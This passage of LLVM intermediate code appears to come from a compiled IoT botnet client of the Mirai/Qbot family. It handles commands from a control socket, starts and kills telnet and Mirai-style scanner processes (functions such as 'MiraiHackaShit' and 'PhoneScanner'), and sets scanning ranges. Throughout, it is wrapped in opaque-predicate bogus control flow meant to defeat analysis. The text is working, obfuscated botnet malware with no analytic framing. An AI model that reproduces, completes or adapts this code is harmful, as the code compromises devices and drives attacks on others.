  %556 = load i8*, i8** %555, align 8
  %557 = call i32 @atoi(i8* %556) #9
  %558 = icmp eq i32 %557, -1
  br i1 %558, label %559, label %562

; <label>:559:                                    ; preds = %553, %originalBBpart268
  %560 = load i32, i32* @mainCommSock, align 4
  %561 = call i32 (i32, i8*, ...) @sockprintf(i32 %560, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.924, i32 0, i32 0))
  br label %574

; <label>:562:                                    ; preds = %553
  %563 = load i32, i32* @mainCommSock, align 4
  %564 = load i32, i32* @mirairange, align 4
  %565 = load i8**, i8*** %12, align 8
  %566 = getelementptr inbounds i8*, i8** %565, i64 1
  %567 = load i8*, i8** %566, align 8
  %568 = call i32 @atoi(i8* %567) #9
  %569 = call i32 (i32, i8*, ...) @sockprintf(i32 %563, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.933, i32 0, i32 0), i32 %564, i32 %568)
  %570 = load i8**, i8*** %12, align 8
  %571 = getelementptr inbounds i8*, i8** %570, i64 1
  %572 = load i8*, i8** %571, align 8
  %573 = call i32 @atoi(i8* %572) #9
  store i32 %573, i32* @mirairange, align 4
  br label %574

; <label>:574:                                    ; preds = %562, %559
  br label %2070

; <label>:575:                                    ; preds = %528
  %576 = load i8**, i8*** %12, align 8
  %577 = getelementptr inbounds i8*, i8** %576, i64 0
  %578 = load i8*, i8** %577, align 8
  %579 = call i32 @strcmp(i8* %578, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.934, i32 0, i32 0)) #9
  %580 = icmp ne i32 %579, 0
  br i1 %580, label %701, label %581

; <label>:581:                                    ; preds = %575
  %582 = load i32, i32* %11, align 4
  %583 = icmp ne i32 %582, 2
  br i1 %583, label %584, label %601

; <label>:584:                                    ; preds = %581
  %585 = load i32, i32* @x.115
  %586 = load i32, i32* @y.116
  %587 = sub i32 %585, 1
  %588 = mul i32 %585, %587
  %589 = urem i32 %588, 2
  %590 = icmp eq i32 %589, 0
  %591 = icmp slt i32 %586, 10
  %592 = or i1 %590, %591
  br i1 %592, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %584
  %593 = load i32, i32* @x.115
  %594 = load i32, i32* @y.116
  %595 = sub i32 %593, 1
  %596 = mul i32 %593, %595
  %597 = urem i32 %596, 2
  %598 = icmp eq i32 %597, 0
  %599 = icmp slt i32 %594, 10
  %600 = or i1 %598, %599
  br i1 %600, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %2070

; <label>:601:                                    ; preds = %581
  %602 = load i8**, i8*** %12, align 8
  %603 = getelementptr inbounds i8*, i8** %602, i64 1
  %604 = load i8*, i8** %603, align 8
  %605 = call i32 @strcmp(i8* %604, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.928, i32 0, i32 0)) #9
  %606 = icmp ne i32 %605, 0
  br i1 %606, label %614, label %607

; <label>:607:                                    ; preds = %601
  %608 = load i32, i32* @Phonepid, align 4
  %609 = icmp eq i32 %608, 0
  br i1 %609, label %610, label %611

; <label>:610:                                    ; preds = %607
  br label %2070

; <label>:611:                                    ; preds = %607
  %612 = load i32, i32* @Phonepid, align 4
  %613 = call i32 @kill(i32 %612, i32 9) #5
  store i32 0, i32* @Phonepid, align 4
  br label %614

; <label>:614:                                    ; preds = %611, %601
  %615 = load i8**, i8*** %12, align 8
  %616 = getelementptr inbounds i8*, i8** %615, i64 1
  %617 = load i8*, i8** %616, align 8
  %618 = call i32 @strcmp(i8* %617, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.927, i32 0, i32 0)) #9
  %619 = icmp ne i32 %618, 0
  br i1 %619, label %700, label %620

; <label>:620:                                    ; preds = %614
  %621 = load i32, i32* @Phonepid, align 4
  %622 = icmp ne i32 %621, 0
  br i1 %622, label %623, label %640

; <label>:623:                                    ; preds = %620
  %624 = load i32, i32* @x.115
  %625 = load i32, i32* @y.116
  %626 = sub i32 %624, 1
  %627 = mul i32 %624, %626
  %628 = urem i32 %627, 2
  %629 = icmp eq i32 %628, 0
  %630 = icmp slt i32 %625, 10
  %631 = or i1 %629, %630
  br i1 %631, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %623
  %632 = load i32, i32* @x.115
  %633 = load i32, i32* @y.116
  %634 = sub i32 %632, 1
  %635 = mul i32 %632, %634
  %636 = urem i32 %635, 2
  %637 = icmp eq i32 %636, 0
  %638 = icmp slt i32 %633, 10
  %639 = or i1 %637, %638
  br i1 %639, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br label %2070

; <label>:640:                                    ; preds = %620
  %641 = call i32 @fork() #5
  store i32 %641, i32* %25, align 4
  %642 = load i32, i32* %25, align 4
  %643 = icmp ugt i32 %642, 0
  br i1 %643, label %644, label %662

; <label>:644:                                    ; preds = %640
  %645 = load i32, i32* @x.115
  %646 = load i32, i32* @y.116
  %647 = sub i32 %645, 1
  %648 = mul i32 %645, %647
  %649 = urem i32 %648, 2
  %650 = icmp eq i32 %649, 0
  %651 = icmp slt i32 %646, 10
  %652 = or i1 %650, %651
  br i1 %652, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %644
  %653 = load i32, i32* %25, align 4
  store i32 %653, i32* @Phonepid, align 4
  %654 = load i32, i32* @x.115
  %655 = load i32, i32* @y.116
  %656 = sub i32 %654, 1
  %657 = mul i32 %654, %656
  %658 = urem i32 %657, 2
  %659 = icmp eq i32 %658, 0
  %660 = icmp slt i32 %655, 10
  %661 = or i1 %659, %660
  br i1 %661, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br label %2070

; <label>:662:                                    ; preds = %640
  %663 = load i32, i32* %25, align 4
  %664 = icmp eq i32 %663, -1
  br i1 %664, label %665, label %682

; <label>:665:                                    ; preds = %662
  %666 = load i32, i32* @x.115
  %667 = load i32, i32* @y.116
  %668 = sub i32 %666, 1
  %669 = mul i32 %666, %668
  %670 = urem i32 %669, 2
  %671 = icmp eq i32 %670, 0
  %672 = icmp slt i32 %667, 10
  %673 = or i1 %671, %672
  br i1 %673, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %665
  %674 = load i32, i32* @x.115
  %675 = load i32, i32* @y.116
  %676 = sub i32 %674, 1
  %677 = mul i32 %674, %676
  %678 = urem i32 %677, 2
  %679 = icmp eq i32 %678, 0
  %680 = icmp slt i32 %675, 10
  %681 = or i1 %679, %680
  br i1 %681, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br label %2070

; <label>:682:                                    ; preds = %662
  %683 = load i32, i32* @x.115
  %684 = load i32, i32* @y.116
  %685 = sub i32 %683, 1
  %686 = mul i32 %683, %685
  %687 = urem i32 %686, 2
  %688 = icmp eq i32 %687, 0
  %689 = icmp slt i32 %684, 10
  %690 = or i1 %688, %689
  br i1 %690, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %682
  %691 = load i32, i32* @x.115
  %692 = load i32, i32* @y.116
  %693 = sub i32 %691, 1
  %694 = mul i32 %691, %693
  %695 = urem i32 %694, 2
  %696 = icmp eq i32 %695, 0
  %697 = icmp slt i32 %692, 10
  %698 = or i1 %696, %697
  br i1 %698, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br label %699

; <label>:699:                                    ; preds = %originalBBpart288
  call void @PhoneScanner()
  call void @_exit(i32 0) #12
  unreachable

; <label>:700:                                    ; preds = %614
  br label %701

; <label>:701:                                    ; preds = %700, %575
  %702 = load i32, i32* @x.115
  %703 = load i32, i32* @y.116
  %704 = sub i32 %702, 1
  %705 = mul i32 %702, %704
  %706 = urem i32 %705, 2
  %707 = icmp eq i32 %706, 0
  %708 = icmp slt i32 %703, 10
  %709 = or i1 %707, %708
  br i1 %709, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %701
  %710 = load i8**, i8*** %12, align 8
  %711 = getelementptr inbounds i8*, i8** %710, i64 0
  %712 = load i8*, i8** %711, align 8
  %713 = call i32 @strcmp(i8* %712, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.935, i32 0, i32 0)) #9
  %714 = icmp ne i32 %713, 0
  %715 = load i32, i32* @x.115
  %716 = load i32, i32* @y.116
  %717 = sub i32 %715, 1
  %718 = mul i32 %715, %717
  %719 = urem i32 %718, 2
  %720 = icmp eq i32 %719, 0
  %721 = icmp slt i32 %716, 10
  %722 = or i1 %720, %721
  br i1 %722, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br i1 %714, label %748, label %723

; <label>:723:                                    ; preds = %originalBBpart292
  %724 = load i32, i32* %11, align 4
  %725 = icmp slt i32 %724, 2
  br i1 %725, label %732, label %726

; <label>:726:                                    ; preds = %723
  %727 = load i8**, i8*** %12, align 8
  %728 = getelementptr inbounds i8*, i8** %727, i64 1
  %729 = load i8*, i8** %728, align 8
  %730 = call i32 @atoi(i8* %729) #9
  %731 = icmp eq i32 %730, -1
  br i1 %731, label %732, label %735

; <label>:732:                                    ; preds = %726, %723
  %733 = load i32, i32* @mainCommSock, align 4
  %734 = call i32 (i32, i8*, ...) @sockprintf(i32 %733, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.936, i32 0, i32 0))
  br label %747

; <label>:735:                                    ; preds = %726
  %736 = load i32, i32* @mainCommSock, align 4
  %737 = load i32, i32* @miraitestrange, align 4
  %738 = load i8**, i8*** %12, align 8
  %739 = getelementptr inbounds i8*, i8** %738, i64 1
  %740 = load i8*, i8** %739, align 8
  %741 = call i32 @atoi(i8* %740) #9
  %742 = call i32 (i32, i8*, ...) @sockprintf(i32 %736, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.937, i32 0, i32 0), i32 %737, i32 %741)
  %743 = load i8**, i8*** %12, align 8
  %744 = getelementptr inbounds i8*, i8** %743, i64 1
  %745 = load i8*, i8** %744, align 8
  %746 = call i32 @atoi(i8* %745) #9
  store i32 %746, i32* @miraitestrange, align 4
  br label %747

; <label>:747:                                    ; preds = %735, %732
  br label %2070

; <label>:748:                                    ; preds = %originalBBpart292
  %749 = load i8**, i8*** %12, align 8
  %750 = getelementptr inbounds i8*, i8** %749, i64 0
  %751 = load i8*, i8** %750, align 8
  %752 = call i32 @strcmp(i8* %751, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.938, i32 0, i32 0)) #9
  %753 = icmp ne i32 %752, 0
  br i1 %753, label %921, label %754

; <label>:754:                                    ; preds = %748
  %755 = load i32, i32* %11, align 4
  %756 = icmp ne i32 %755, 2
  br i1 %756, label %757, label %758

; <label>:757:                                    ; preds = %754
  br label %2070

; <label>:758:                                    ; preds = %754
  %759 = load i8**, i8*** %12, align 8
  %760 = getelementptr inbounds i8*, i8** %759, i64 1
  %761 = load i8*, i8** %760, align 8
  %762 = call i32 @strcmp(i8* %761, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.928, i32 0, i32 0)) #9
  %763 = icmp ne i32 %762, 0
  br i1 %763, label %787, label %764

; <label>:764:                                    ; preds = %758
  %765 = load i32, i32* @testmiraiPid, align 4
  %766 = icmp eq i32 %765, 0
  br i1 %766, label %767, label %768

; <label>:767:                                    ; preds = %764
  br label %2070

; <label>:768:                                    ; preds = %764
  %769 = load i32, i32* @x.115
  %770 = load i32, i32* @y.116
  %771 = sub i32 %769, 1
  %772 = mul i32 %769, %771
  %773 = urem i32 %772, 2
  %774 = icmp eq i32 %773, 0
  %775 = icmp slt i32 %770, 10
  %776 = or i1 %774, %775
  br i1 %776, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %768
  %777 = load i32, i32* @testmiraiPid, align 4
  %778 = call i32 @kill(i32 %777, i32 9) #5
  store i32 0, i32* @testmiraiPid, align 4
  %779 = load i32, i32* @x.115
  %780 = load i32, i32* @y.116
  %781 = sub i32 %779, 1
  %782 = mul i32 %779, %781
  %783 = urem i32 %782, 2
  %784 = icmp eq i32 %783, 0
  %785 = icmp slt i32 %780, 10
  %786 = or i1 %784, %785
  br i1 %786, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br label %787

; <label>:787:                                    ; preds = %originalBBpart296, %758
  %788 = load i8**, i8*** %12, align 8
  %789 = getelementptr inbounds i8*, i8** %788, i64 1
  %790 = load i8*, i8** %789, align 8
  %791 = call i32 @strcmp(i8* %790, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.927, i32 0, i32 0)) #9
  %792 = icmp ne i32 %791, 0
  br i1 %792, label %857, label %793

; <label>:793:                                    ; preds = %787
  %794 = load i32, i32* @testmiraiPid, align 4
  %795 = icmp ne i32 %794, 0
  br i1 %795, label %796, label %797

; <label>:796:                                    ; preds = %793
  br label %2070

; <label>:797:                                    ; preds = %793
  %798 = load i32, i32* @x.115
  %799 = load i32, i32* @y.116
  %800 = sub i32 %798, 1
  %801 = mul i32 %798, %800
  %802 = urem i32 %801, 2
  %803 = icmp eq i32 %802, 0
  %804 = icmp slt i32 %799, 10
  %805 = or i1 %803, %804
  br i1 %805, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %797
  %806 = call i32 @fork() #5
  store i32 %806, i32* %26, align 4
  %807 = load i32, i32* %26, align 4
  %808 = icmp ugt i32 %807, 0
  %809 = load i32, i32* @x.115
  %810 = load i32, i32* @y.116
  %811 = sub i32 %809, 1
  %812 = mul i32 %809, %811
  %813 = urem i32 %812, 2
  %814 = icmp eq i32 %813, 0
  %815 = icmp slt i32 %810, 10
  %816 = or i1 %814, %815
  br i1 %816, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %808, label %817, label %835

; <label>:817:                                    ; preds = %originalBBpart2100
  %818 = load i32, i32* @x.115
  %819 = load i32, i32* @y.116
  %820 = sub i32 %818, 1
  %821 = mul i32 %818, %820
  %822 = urem i32 %821, 2
  %823 = icmp eq i32 %822, 0
  %824 = icmp slt i32 %819, 10
  %825 = or i1 %823, %824
  br i1 %825, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %817
  %826 = load i32, i32* %26, align 4
  store i32 %826, i32* @testmiraiPid, align 4
  %827 = load i32, i32* @x.115
  %828 = load i32, i32* @y.116
  %829 = sub i32 %827, 1
  %830 = mul i32 %827, %829
  %831 = urem i32 %830, 2
  %832 = icmp eq i32 %831, 0
  %833 = icmp slt i32 %828, 10
  %834 = or i1 %832, %833
  br i1 %834, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br label %2070

; <label>:835:                                    ; preds = %originalBBpart2100
  %836 = load i32, i32* @x.115
  %837 = load i32, i32* @y.116
  %838 = sub i32 %836, 1
  %839 = mul i32 %836, %838
  %840 = urem i32 %839, 2
  %841 = icmp eq i32 %840, 0
  %842 = icmp slt i32 %837, 10
  %843 = or i1 %841, %842
  br i1 %843, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %835
  %844 = load i32, i32* %26, align 4
  %845 = icmp eq i32 %844, -1
  %846 = load i32, i32* @x.115
  %847 = load i32, i32* @y.116
  %848 = sub i32 %846, 1
  %849 = mul i32 %846, %848
  %850 = urem i32 %849, 2
  %851 = icmp eq i32 %850, 0
  %852 = icmp slt i32 %847, 10
  %853 = or i1 %851, %852
  br i1 %853, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %845, label %854, label %855

; <label>:854:                                    ; preds = %originalBBpart2108
  br label %2070

; <label>:855:                                    ; preds = %originalBBpart2108
  br label %856

; <label>:856:                                    ; preds = %855
  call void @MiraiHackaShit()
  call void @_exit(i32 0) #12
  unreachable

; <label>:857:                                    ; preds = %787
  %858 = load i8**, i8*** %12, align 8
  %859 = getelementptr inbounds i8*, i8** %858, i64 0
  %860 = load i8*, i8** %859, align 8
  %861 = call i32 @strcmp(i8* %860, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.939, i32 0, i32 0)) #9
  %862 = icmp ne i32 %861, 0
  br i1 %862, label %920, label %863

; <label>:863:                                    ; preds = %857
  %864 = load i32, i32* @x.115
  %865 = load i32, i32* @y.116
  %866 = sub i32 %864, 1
  %867 = mul i32 %864, %866
  %868 = urem i32 %867, 2
  %869 = icmp eq i32 %868, 0
  %870 = icmp slt i32 %865, 10
  %871 = or i1 %869, %870
  br i1 %871, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %863
  %872 = load i32, i32* %11, align 4
  %873 = icmp slt i32 %872, 2
  %874 = load i32, i32* @x.115
  %875 = load i32, i32* @y.116
  %876 = sub i32 %874, 1
  %877 = mul i32 %874, %876
  %878 = urem i32 %877, 2
  %879 = icmp eq i32 %878, 0
  %880 = icmp slt i32 %875, 10
  %881 = or i1 %879, %880
  br i1 %881, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br i1 %873, label %888, label %882

; <label>:882:                                    ; preds = %originalBBpart2112
  %883 = load i8**, i8*** %12, align 8
  %884 = getelementptr inbounds i8*, i8** %883, i64 1
  %885 = load i8*, i8** %884, align 8
  %886 = call i32 @atoi(i8* %885) #9
  %887 = icmp eq i32 %886, -1
  br i1 %887, label %888, label %907

; <label>:888:                                    ; preds = %882, %originalBBpart2112
  %889 = load i32, i32* @x.115
  %890 = load i32, i32* @y.116
  %891 = sub i32 %889, 1
  %892 = mul i32 %889, %891
  %893 = urem i32 %892, 2
  %894 = icmp eq i32 %893, 0
  %895 = icmp slt i32 %890, 10
  %896 = or i1 %894, %895
  br i1 %896, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %888
  %897 = load i32, i32* @mainCommSock, align 4
  %898 = call i32 (i32, i8*, ...) @sockprintf(i32 %897, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.940, i32 0, i32 0))
  %899 = load i32, i32* @x.115
  %900 = load i32, i32* @y.116
  %901 = sub i32 %899, 1
  %902 = mul i32 %899, %901
  %903 = urem i32 %902, 2
  %904 = icmp eq i32 %903, 0
  %905 = icmp slt i32 %900, 10
  %906 = or i1 %904, %905
  br i1 %906, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br label %919

; <label>:907:                                    ; preds = %882
  %908 = load i32, i32* @mainCommSock, align 4
  %909 = load i32, i32* @telnettestrange, align 4
  %910 = load i8**, i8*** %12, align 8
  %911 = getelementptr inbounds i8*, i8** %910, i64 1
  %912 = load i8*, i8** %911, align 8
  %913 = call i32 @atoi(i8* %912) #9
  %914 = call i32 (i32, i8*, ...) @sockprintf(i32 %908, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.937, i32 0, i32 0), i32 %909, i32 %913)
  %915 = load i8**, i8*** %12, align 8
  %916 = getelementptr inbounds i8*, i8** %915, i64 1
  %917 = load i8*, i8** %916, align 8
  %918 = call i32 @atoi(i8* %917) #9
  store i32 %918, i32* @telnettestrange, align 4
  br label %919

; <label>:919:                                    ; preds = %907, %originalBBpart2116
  br label %2070

; <label>:920:                                    ; preds = %857
  br label %921

; <label>:921:                                    ; preds = %920, %748
  %922 = load i32, i32* @x.115
  %923 = load i32, i32* @y.116
  %924 = sub i32 %922, 1
  %925 = mul i32 %922, %924
  %926 = urem i32 %925, 2
  %927 = icmp eq i32 %926, 0
  %928 = icmp slt i32 %923, 10
  %929 = or i1 %927, %928
  br i1 %929, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %921
  %930 = load i8**, i8*** %12, align 8
  %931 = getelementptr inbounds i8*, i8** %930, i64 0
  %932 = load i8*, i8** %931, align 8
  %933 = call i32 @strcmp(i8* %932, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.941, i32 0, i32 0)) #9
  %934 = icmp ne i32 %933, 0
  %935 = load i32, i32* @x.115
  %936 = load i32, i32* @y.116
  %937 = sub i32 %935, 1
  %938 = mul i32 %935, %937
  %939 = urem i32 %938, 2
  %940 = icmp eq i32 %939, 0
  %941 = icmp slt i32 %936, 10
  %942 = or i1 %940, %941
  br i1 %942, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br i1 %934, label %1063, label %943

; <label>:943:                                    ; preds = %originalBBpart2120
  %944 = load i32, i32* @x.115
  %945 = load i32, i32* @y.116
  %946 = sub i32 %944, 1
  %947 = mul i32 %944, %946
  %948 = urem i32 %947, 2
  %949 = icmp eq i32 %948, 0
  %950 = icmp slt i32 %945, 10
  %951 = or i1 %949, %950
  br i1 %951, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %943
  %952 = load i32, i32* %11, align 4
  %953 = icmp ne i32 %952, 2
  %954 = load i32, i32* @x.115
  %955 = load i32, i32* @y.116
  %956 = sub i32 %954, 1
  %957 = mul i32 %954, %956
  %958 = urem i32 %957, 2
  %959 = icmp eq i32 %958, 0
  %960 = icmp slt i32 %955, 10
  %961 = or i1 %959, %960
  br i1 %961, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br i1 %953, label %962, label %963

; <label>:962:                                    ; preds = %originalBBpart2124
  br label %2070

; <label>:963:                                    ; preds = %originalBBpart2124
  %964 = load i8**, i8*** %12, align 8
  %965 = getelementptr inbounds i8*, i8** %964, i64 1
  %966 = load i8*, i8** %965, align 8
  %967 = call i32 @strcmp(i8* %966, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.928, i32 0, i32 0)) #9
  %968 = icmp ne i32 %967, 0
  br i1 %968, label %992, label %969

; <label>:969:                                    ; preds = %963
  %970 = load i32, i32* @testtelnetPid, align 4
  %971 = icmp eq i32 %970, 0
  br i1 %971, label %972, label %989

; <label>:972:                                    ; preds = %969
  %973 = load i32, i32* @x.115
  %974 = load i32, i32* @y.116
  %975 = sub i32 %973, 1
  %976 = mul i32 %973, %975
  %977 = urem i32 %976, 2
  %978 = icmp eq i32 %977, 0
  %979 = icmp slt i32 %974, 10
  %980 = or i1 %978, %979
  br i1 %980, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %972
  %981 = load i32, i32* @x.115
  %982 = load i32, i32* @y.116
  %983 = sub i32 %981, 1
  %984 = mul i32 %981, %983
  %985 = urem i32 %984, 2
  %986 = icmp eq i32 %985, 0
  %987 = icmp slt i32 %982, 10
  %988 = or i1 %986, %987
  br i1 %988, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br label %2070

; <label>:989:                                    ; preds = %969
  %990 = load i32, i32* @testtelnetPid, align 4
  %991 = call i32 @kill(i32 %990, i32 9) #5
  store i32 0, i32* @testtelnetPid, align 4
  br label %992

; <label>:992:                                    ; preds = %989, %963
  %993 = load i8**, i8*** %12, align 8
  %994 = getelementptr inbounds i8*, i8** %993, i64 1
  %995 = load i8*, i8** %994, align 8
  %996 = call i32 @strcmp(i8* %995, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.927, i32 0, i32 0)) #9
  %997 = icmp ne i32 %996, 0
  br i1 %997, label %1046, label %998

; <label>:998:                                    ; preds = %992
  %999 = load i32, i32* @testtelnetPid, align 4
  %1000 = icmp ne i32 %999, 0
  br i1 %1000, label %1001, label %1018

; <label>:1001:                                   ; preds = %998
  %1002 = load i32, i32* @x.115
  %1003 = load i32, i32* @y.116
  %1004 = sub i32 %1002, 1
  %1005 = mul i32 %1002, %1004
  %1006 = urem i32 %1005, 2
  %1007 = icmp eq i32 %1006, 0
  %1008 = icmp slt i32 %1003, 10
  %1009 = or i1 %1007, %1008
  br i1 %1009, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %1001
  %1010 = load i32, i32* @x.115
  %1011 = load i32, i32* @y.116
  %1012 = sub i32 %1010, 1
  %1013 = mul i32 %1010, %1012
  %1014 = urem i32 %1013, 2
  %1015 = icmp eq i32 %1014, 0
  %1016 = icmp slt i32 %1011, 10
  %1017 = or i1 %1015, %1016
  br i1 %1017, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br label %2070

; <label>:1018:                                   ; preds = %998
  %1019 = call i32 @fork() #5
  store i32 %1019, i32* %27, align 4
  %1020 = load i32, i32* %27, align 4
  %1021 = icmp ugt i32 %1020, 0
  br i1 %1021, label %1022, label %1024

; <label>:1022:                                   ; preds = %1018
  %1023 = load i32, i32* %27, align 4
  store i32 %1023, i32* @testtelnetPid, align 4
  br label %2070

; <label>:1024:                                   ; preds = %1018
  %1025 = load i32, i32* %27, align 4
  %1026 = icmp eq i32 %1025, -1
  br i1 %1026, label %1027, label %1044

; <label>:1027:                                   ; preds = %1024
  %1028 = load i32, i32* @x.115
  %1029 = load i32, i32* @y.116
  %1030 = sub i32 %1028, 1
  %1031 = mul i32 %1028, %1030
  %1032 = urem i32 %1031, 2
  %1033 = icmp eq i32 %1032, 0
  %1034 = icmp slt i32 %1029, 10
  %1035 = or i1 %1033, %1034
  br i1 %1035, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %1027
  %1036 = load i32, i32* @x.115
  %1037 = load i32, i32* @y.116
  %1038 = sub i32 %1036, 1
  %1039 = mul i32 %1036, %1038
  %1040 = urem i32 %1039, 2
  %1041 = icmp eq i32 %1040, 0
  %1042 = icmp slt i32 %1037, 10
  %1043 = or i1 %1041, %1042
  br i1 %1043, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br label %2070

; <label>:1044:                                   ; preds = %1024
  br label %1045

; <label>:1045:                                   ; preds = %1044
  call void @HackaShit()
  call void @_exit(i32 0) #12
  unreachable

; <label>:1046:                                   ; preds = %992
  %1047 = load i32, i32* @x.115
  %1048 = load i32, i32* @y.116
  %1049 = sub i32 %1047, 1
  %1050 = mul i32 %1047, %1049
  %1051 = urem i32 %1050, 2
  %1052 = icmp eq i32 %1051, 0
  %1053 = icmp slt i32 %1048, 10
  %1054 = or i1 %1052, %1053
  br i1 %1054, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1046
  %1055 = load i32, i32* @x.115
  %1056 = load i32, i32* @y.116
  %1057 = sub i32 %1055, 1
  %1058 = mul i32 %1055, %1057
  %1059 = urem i32 %1058, 2
  %1060 = icmp eq i32 %1059, 0
  %1061 = icmp slt i32 %1056, 10
  %1062 = or i1 %1060, %1061
  br i1 %1062, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br label %1063

; <label>:1063:                                   ; preds = %originalBBpart2140, %originalBBpart2120
  %1064 = load i32, i32* @x.115
  %1065 = load i32, i32* @y.116
  %1066 = sub i32 %1064, 1
  %1067 = mul i32 %1064, %1066
  %1068 = urem i32 %1067, 2
  %1069 = icmp eq i32 %1068, 0
  %1070 = icmp slt i32 %1065, 10
  %1071 = or i1 %1069, %1070
  br i1 %1071, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1063
  %1072 = load i8**, i8*** %12, align 8
  %1073 = getelementptr inbounds i8*, i8** %1072, i64 0
  %1074 = load i8*, i8** %1073, align 8
  %1075 = call i32 @strcmp(i8* %1074, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.475, i32 0, i32 0)) #9
  %1076 = icmp ne i32 %1075, 0
  %1077 = load i32, i32* @x.115
  %1078 = load i32, i32* @y.116
  %1079 = sub i32 %1077, 1
  %1080 = mul i32 %1077, %1079
  %1081 = urem i32 %1080, 2
  %1082 = icmp eq i32 %1081, 0
  %1083 = icmp slt i32 %1078, 10
  %1084 = or i1 %1082, %1083
  br i1 %1084, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br i1 %1076, label %1189, label %1085

; <label>:1085:                                   ; preds = %originalBBpart2144
  %1086 = load i32, i32* %11, align 4
  %1087 = icmp ne i32 %1086, 2
  br i1 %1087, label %1088, label %1089

; <label>:1088:                                   ; preds = %1085
  br label %2070

; <label>:1089:                                   ; preds = %1085
  %1090 = load i32, i32* @x.115
  %1091 = load i32, i32* @y.116
  %1092 = sub i32 %1090, 1
  %1093 = mul i32 %1090, %1092
  %1094 = urem i32 %1093, 2
  %1095 = icmp eq i32 %1094, 0
  %1096 = icmp slt i32 %1091, 10
  %1097 = or i1 %1095, %1096
  br i1 %1097, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1089
  %1098 = load i8**, i8*** %12, align 8
  %1099 = getelementptr inbounds i8*, i8** %1098, i64 1
  %1100 = load i8*, i8** %1099, align 8
  %1101 = call i32 @strcmp(i8* %1100, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.928, i32 0, i32 0)) #9
  %1102 = icmp ne i32 %1101, 0
  %1103 = load i32, i32* @x.115
  %1104 = load i32, i32* @y.116
  %1105 = sub i32 %1103, 1
  %1106 = mul i32 %1103, %1105
  %1107 = urem i32 %1106, 2
  %1108 = icmp eq i32 %1107, 0
  %1109 = icmp slt i32 %1104, 10
  %1110 = or i1 %1108, %1109
  br i1 %1110, label %originalBBpart2148, label %originalBB146alteredBB

